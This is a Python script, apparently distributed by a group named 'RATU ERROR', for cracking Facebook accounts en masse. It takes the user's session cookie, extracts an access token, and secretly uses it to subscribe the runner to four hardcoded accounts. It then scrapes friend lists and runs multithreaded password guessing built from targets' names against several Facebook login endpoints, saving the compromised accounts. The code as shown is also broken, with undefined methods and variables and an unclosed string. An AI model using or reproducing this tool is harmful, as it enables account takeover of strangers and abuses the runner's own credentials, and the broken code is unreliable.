# coding=utf-8

#     *file name: Colmexs
#     *copyright: (C) © 2023 ~ Jessica Putry
#     *contact me on whatsap: +6287799183568
#     *Group Facebok: RATU ERROR (owner)

#--- module in python
import os,sys,requests,re,bs4,datetime,json,time,random,platform
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from datetime import datetime
from random import randint

# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm = []

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}


for x in range(1000):
	rr = random.randint
	versi_android = random.randint(4,12)
	versi_chrome = str(random.randint(50,109))+".0."+str(random.randint(1000,5999))+"."+str(random.randint(50,109))
	fbi = str(random.randint(100,599))+".0.0."+str(random.randint(10,99))+"."+str(random.randint(99,199))
	versi_app = random.randint(410000000,499999999)
	#ugent3 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
	#ugent3 = f"Mozilla/5.0 (Linux; Android {versi_android}; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbi};]"
	ugent3 = f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/{fbi};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/{str(random.randint(4,10))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920};FB_FW/1;]"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)
 
# USER AGENT
def UAS(): # random ua
	uas= (["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 SznProhlizec/9.1.1a", "Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 SznProhlizec/9.1.1a", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/16.1.1 Safari/605.1.15 AlohaBrowser/4.4.2", "Mozilla/5.0 (Linux; Android 12; M2101K6G Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Maxthon/13400", "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.7 (KHTML, like Gecko) RockMelt/0.8.36.79 Chrome/7.0.517.44 Safari/534.7", "Mozilla/5.0 (Linux; Android 10; MOA-LX9N; U; ru) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Tenta/4.0.09 Build/2392 Safari/537.36"])
	
	rand_ua = random.choice(uas)
	return rand_ua 
def UA():
	try:
		uas = open('ugent.txt','r').read()
	except (FileNotFoundError,IOError):
		uas = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
		open('ugent.txt','w').write(uas)
	
	return uas 

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

def hokage1():
 rr = random.randint; rc = random.choice
 aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
 leng = ['es-es','nl-nl','zh-CN','uk-us','ar-ae','ru-ua','tr-tr','zh-cn','ko-kr','ja-jp','ar-eg','en-ca','de-de','pl-pl','cs-cz','es-co','sl-si','en-ph','en-za','en-bh','fa-ir','it-it','es-mx','ru-us','cs-cz','ro-ro','ru-ru','en-us','en-gb','zh-zh','zh-cn','en-GB','en-US','fr-fr','zh-fr','my-zg']
 build = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
 return str(rc([f"mozilla/5.0 (linux; u; android {str(rr(1,4))}.{str(rr(1,2))}.{str(rr(1,2))}; en-us; evercoss a7r build/jdq39) applewebkit/534.30 (khtml, like gecko) version/{str(rr(1,4))}.0 ucbrowser/{str(rr(1,11))}.0.{str(rr(1,8))}.{str(rr(100,855))} u3/0.{str(rr(1,8))}.0 mobile safari/534.30"]))

# LOGO
def logo():
	time.sleep (0.01)
	print ('')
	print ('')
	jalan ('\x1b[1;97m                       _____---____ ')
	jalan ('\x1b[1;97m                    ________---_______ ')
	jalan ('\x1b[1;97m         ___-----           __      ----_ ')
	jalan ('\x1b[1;97m    ---______        ----                 \ ')
	jalan ('\x1b[1;97m                 --__    |             _____) ')
	jalan ('\x1b[1;97m                     -                /     \ ')
	jalan ('\x1b[1;97m          _____-----    ___--         \    /)\ ')
	jalan ('\x1b[1;97m    -----_____      ---____            \__/  / ')
	jalan ('\x1b[1;97m                 --__    \ --    _          /\ ')
	jalan ('\x1b[1;97m                      --__-__     \_____/   \_/\ ')
	jalan ('\x1b[1;97m                            ----|   /          | ')
	jalan ('\x1b[1;96mAuthor \x1b[1;97m : \x1b[1;91mRomi Afrizal\x1b[1;97m          |  |___________| ')
	jalan ('\x1b[1;96mAdmin  \x1b[1;97m : \x1b[1;93mJessica Putri\x1b[1;97m         |  | ((_(_)| )_) ')
	jalan ('\x1b[1;96mGroup\x1b[1;97m   : \x1b[1;92mRATU ERROR            \33[0;1m\x1b[1;97m|  \_((_(_)|/(_) ')
	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\             ( ')
	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\_____________)')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')

id = []
cp = []
ok = []
loop = 0
	
# METHODE LOGIN
def login():
	try:
		ses = requests.Session()
		cookie = input(f'\n{P} Masukan cookie anda :{K} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open("data/token.txt", "w").write(tok)
		cokiew = open("data/cookie.txt", "w").write(cookie)
		print (f"\n{P} + token:{H} {tok}");jeda(2)
		requests.post(f"https://graph.facebook.com/100067807565861/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		requests.post(f"https://graph.facebook.com/100029143111567/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		requests.post(f"https://graph.facebook.com/100043505053045/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		print (f"\n{H} √ login berhasil");jeda(2)
		menu()
	except Exception as e:
		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
		print(e)
		exit()
#  MENU
def menu():
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		nama = json.loads(requests.get(f'https://graph.facebook.com/me?fields=name,id&access_token={token}',cookies=coki).text)["name"] 
	except (FileNotFoundError,KeyError,IOError):
		print (f"{M} ! cookie invalid");jeda(2)
		login()
	except requests.exceptions.ConnectionError:
		exit(f"{M} ! tidak ada koneksi")
	banner()
	print('')
	print('')
	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
	print (' \x1b[1;96m[\x1b[1;97m3x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
	print (' \x1b[1;96m[\x1b[1;97m4x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
	print (' \x1b[1;96m[\x1b[1;97m5x1b[1;96m] \x1b[1;97mCrack dari  anggota group
	print (' \x1b[1;96m[\x1b[1;97m6x1b[1;96m] \x1b[1;97mLihat hasil crack')
	print (' \x1b[1;96m[\x1b[1;97m7x1b[1;96m] \x1b[1;97mSetting user agent')
	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
	print('')
	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if romz in ['']:
		print ("\n ! jangan kosong")
	elif romz in ['1']:
		publik(token,coki)
	elif romz in ['2']:
		massal(token,coki)
	elif romz in ['3']:
		hasil()
	elif romz in ['4']:
		UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
			open('ugent.txt','w').write(uas)
		else:
			open('ugent.txt','w').write(us)
	elif romz in ['0']:
		exit()
	else:
		print ("\n ! isi yg benar")

def activate_licensi():
	os.system("clear")
	logo()
	print("\n\n\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk chat admin dan mendapatkan lisensi script dari admin....terima kasih\n")
	key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
	if "gets" in key:
		os.system("xdg-open https://fbkey.ratuerror.com/register/")
		activate_licensi()
	elif "admin" in key:
		os.system("xdg-open https://wa.me/6287799183568?text=RATU%20COLMEX's....beli%20lisensi%20dooong")
		activate_licensi()
	else:
		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
		if "error" in gets["status"]:
			exit(" [×] message: "+gets["msg"]+"\n\n")
		elif "berlaku" in gets["status"]:
			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
			open(".licensi","w").write(key.strip())
			menu()
			os.system("clear")
		elif "kadaluarsa" in gets["status"]:
			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
		else:
			exit("[!] licensi tidak valid")

id =[]
# CRACK PUBLIK
def publik(token,cookie):
	try:
		user=input(f"\n{P} Masukan ID publik :\x1b[1;93m ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)
	
# CRACK UNLIMITED
def massal(token,cookie):
	try:
		print ('')
		jum = int(input(f"{P} Jumlah target : "))
		print ('')
	except:jum=1
	for t in range(jum):
		t +=1
		try:
			user=input(f"{P} Masukan ID publik {t}:\x1b[1;93m ")
			if user in pepek:
				exit("\n ! gk usah tolol")
			else:
				po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
				for i in po['friends']['data']:
					id.append(f"{i['id']}<=>{i['name']}")
		except KeyError:
			exit(f"{M} gagal mengambil ID")
	print (f'\r {P}Jumlah ID{M} :{H} {len(id)} ')
	
	return crack().__xnx__(id)

# LIHAT HASIL
oke,cepe=[],[]
def hasil():
	print(f"""
 1. Cek hasil akun {H}OK{P}
 2. Cek hasil akun {K}CP{P}
 0. Kembali
	""")
	rom = input(' ? Pilih: ')
	if rom in['']:
		exit("\n ! isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {H}OK{P} yg fersimpan di folder anda')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{H} {i} {P}-{H} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {H}{len(totalok)}")
			print(f"{P}#---")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {K}CP{P} yg fersimpan di folder anda')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{K} {i} {P}-{K} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}#---")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n ! isi yg benar")
	
# METHDOE CRACK
ok,cp,loop=[],[],0
class crack:
	
	def __init__(self):
		self.id =[]
	
	def __xnx__(self,id):
		self.id =id 
		cx=input(f" {P}Gunakan password manual {H}y{P}/{M}t {P}:\x1b[1;93m ")
		print ('')
		if cx in ('y'):
			self.manual()
		elif cx in ('t'):
			print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
			print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
			print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
			print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
			print ('')
			self.langsung()
		else:
			exit()
	
	def manual(self):
		print (f"\n{P} ! contoh: sayang,anjing,123456")
		pwek=input(" ? password: ")
		if pwek in(''):
			exit("\n ! jangan kosong")
		elif len(pwek)<=5:
			exit("\n ! password minimal 6 huruf")
		else:
			pass 
		print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
		print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
		print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
		print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 \x1b[1;97makun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid = akun.split('<=>')[0]
				pwx = pwek.split(",")
				if men in['1']:
					titid.submit(self.__Nugraha__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__Nugraha__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__Nugraha__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
		
	def langsung(self):
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 {P}+ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 + crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
				na = name.split(' ')[0]
				if len(name)<6:
					if len(na)<3:
						pass 
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
				else:
					if len(na)<3:
						pwx.append(name)
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
				if men in['1']:
					titid.submit(self.__Nugraha__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__Nugraha__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__Nugraha__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
		

	# FINISH
	def hasil(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			print (f"\n\n{H} √ {P}crack selesai....")
			print (f"{H} + OK: {len(ok)} ")
			print (f"{K} + CP: {len(cp)}{P}");exit()
		else:
			exit(f"\n {M}× ops tidak mendapatkan hasil")


if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
	try:os.mkdir('data')
	except:pass 
	menu()
